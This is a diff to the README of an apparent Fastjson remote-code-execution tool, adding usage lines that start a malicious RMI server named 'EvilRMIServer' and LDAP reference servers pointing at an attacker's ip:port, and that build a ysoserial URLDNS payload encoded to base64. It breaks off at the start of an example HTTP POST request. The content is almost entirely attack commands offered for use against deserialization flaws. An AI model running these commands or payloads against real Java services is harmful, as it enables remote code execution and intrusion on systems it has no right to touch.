@@ -1,13 +1,21 @@
 # fastjson_rce_tool
 
+```
 rmi:
-java -cp fastjson_tool.jar EvilRMIServer 1099 53 "curl dnslog.cn"
+java -cp fastjson_tool.jar EvilRMIServer 1099 53 "curl .cn"
 
 
 ladp:
+1.
 java -cp fastjson_tool.jar LDAPRefServer http://ip:port/#Object 8888
 
-示例：
+2.
+java -jar ysoserial6.jar URLDNS 'http://wyzxxz.cn'|base64 > base64_payload_file
+java -cp fastjson_tool.jar LDAPRefServer2 8888  base64_payload_file
+
+```
+
+example：
 
 ```
 POST /test HTTP/1.1
